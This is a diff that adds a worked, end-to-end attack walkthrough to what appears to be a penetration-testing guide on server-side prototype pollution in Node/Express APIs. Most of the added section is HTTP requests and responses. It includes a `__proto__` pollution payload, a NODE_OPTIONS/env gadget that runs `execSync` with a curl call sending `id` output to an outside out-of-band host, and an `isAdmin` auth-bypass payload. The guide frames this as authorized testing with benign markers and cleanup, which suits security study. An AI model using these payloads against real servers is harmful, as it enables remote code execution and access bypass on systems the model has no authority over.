@@ -166,6 +166,70 @@ The **`json spaces`** oracle is the most reliable and the most benign — prefer
 
 Once you have a source + confirmed pollution, land a **gadget**. Match the gadget to what the target actually runs (fingerprint the template engine, spot `child_process` usage, read the dependency list). The famous families:
 
+## 3.0 The full attack, end-to-end — blind SSPP → `json spaces` oracle → `child_process` RCE (worked transcript) ⭐
+
+> *This is the flagship worked example* — the highest-impact prototype-pollution path (server-side → RCE) stitched into one wire-level walk. It shows the discipline that makes SSPP reportable: **baseline → pollute → re-request → diff**, confirm it's *global* (not reflection), then land a gadget. Own instance / authorized target; benign marker, and mind the process-global caution (§7.3).
+
+**Target.** An Express (Node) API at `api.target.com` with a profile endpoint that **deep-merges** your JSON body into a settings object (`_.merge(userSettings, req.body)`) — the classic source (§1.2). Goal: prove it reaches RCE, not just "a property was accepted."
+
+**Step 1 — baseline the oracle (§2.2).** Pick the cleanest, most benign oracle first — Express's `json spaces`, which controls JSON indentation of *every* later response. Record the normal shape:
+```http
+GET /api/profile HTTP/1.1
+Host: api.target.com
+```
+```
+HTTP/1.1 200 OK
+{"id":1001,"name":"alice","plan":"free"}          # compact, no indentation — the baseline
+```
+
+**Step 2 — pollute via the merge sink.** Send `__proto__` in the body the endpoint merges:
+```http
+POST /api/profile/update HTTP/1.1
+Host: api.target.com
+Content-Type: application/json
+
+{"__proto__":{"json spaces":10}}
+```
+```
+HTTP/1.1 200 OK
+{"updated":true}                                   # no visible effect here — SSPP is blind
+```
+
+**Step 3 — re-request an UNRELATED endpoint and diff (the confirmation).**
+```http
+GET /api/profile HTTP/1.1
+Host: api.target.com
+```
+```
+HTTP/1.1 200 OK
+{
+          "id": 1001,
+          "name": "alice",
+          "plan": "free"
+}                                                  # now indented 10 spaces → Object.prototype was polluted
+```
+The indentation appeared on a response I didn't pollute directly — the setting fell through the polluted prototype into `JSON.stringify`. **That is confirmed server-side prototype pollution**, not reflection (§2.3): a *fresh* response object inherited my property. Confirm persistence by hitting a *third* endpoint (`/api/health`) — still indented = process-global, until restart.
+
+**Step 4 — fingerprint the RCE gadget (§3.1).** Pollution alone is High; RCE needs a gadget the app actually reaches. I read the JS bundle / behaviour and see the app shells out (an avatar-to-PDF/image job uses `child_process.spawn`) and builds the options object without setting every key — the Silent-Spring precondition. The **no-file-write** gadget (B) fits: pollute `NODE_OPTIONS=--require /proc/self/environ` and smuggle the JS into an env var, so the next spawned Node child executes it.
+
+**Step 5 — land the gadget, benign marker only.** Re-pollute with the execution-controlling options (from §3.1 Gadget B), then trigger the child-process path (request the PDF/image job). The next `spawn` inherits the polluted `NODE_OPTIONS`:
+```http
+POST /api/profile/update HTTP/1.1
+Content-Type: application/json
+
+{"__proto__":{"NODE_OPTIONS":"--require /proc/self/environ","env":{"EVIL":"require('child_process').execSync('curl https://OOB.oast.fun/$(id|base64)')//"}}}
+```
+```
+# then trigger the child_process (e.g. POST /api/avatar/export) → the spawned node loads /proc/self/environ →
+# your EVIL env var executes → OOB hit:
+[interactsh] DNS/HTTP  uid=33(...)-base64...  from api.target.com egress   → RCE CONFIRMED
+```
+An OOB callback carrying `id` output = **arbitrary command execution as the Node process** — Critical. One benign marker (an OOB ping / a unique file), then **STOP**.
+
+**Step 6 — clean up (mandatory for PP).** Prototype pollution is **process-global and persists until restart** (§7.3). Don't leave a broken `json spaces`/`status`/`NODE_OPTIONS` on the prototype — where the app exposes a reset or the pollution is per-request-object, revert it; otherwise note in the report that a restart clears it and never pollute a property that degrades production.
+
+**Why this is the PP-defining path.** The bug is invisible (`{"updated":true}` told you nothing) — the finding lives entirely in the **oracle diff** (an unrelated response changed shape) and the **gadget** (a missing option key fell through to your polluted prototype). Source → blind-confirm via a benign oracle → gadget → RCE, and the same source also drives the gadget-free auth bypass (§3.4, `{"__proto__":{"isAdmin":true}}`) and client-side DOM-XSS (Part IV).
+
 ## 3.1 `child_process` gadgets — the RCE workhorse (Silent Spring)
 
 When the app later calls `child_process.spawn/exec/execFile/fork/execSync` and builds the **options** object without setting every key, the missing keys fall through to the polluted prototype. Inject execution-controlling options:
